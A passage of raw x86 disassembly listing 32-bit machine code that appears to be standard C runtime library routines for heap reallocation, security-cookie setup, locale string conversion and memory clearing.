  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
